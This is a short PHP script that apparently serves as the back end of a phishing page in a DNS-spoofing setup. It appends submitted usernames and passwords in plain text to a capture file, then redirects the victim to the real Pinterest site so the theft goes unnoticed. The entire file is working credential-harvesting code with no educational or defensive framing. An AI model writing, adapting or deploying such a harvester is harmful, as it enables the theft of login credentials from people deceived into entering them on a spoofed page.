<?php

file_put_contents("/root/rpi_gui_map/DNSSpoof/captures/usernames.txt", "Account: " . $_POST['id'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://pinterest.com');
exit();
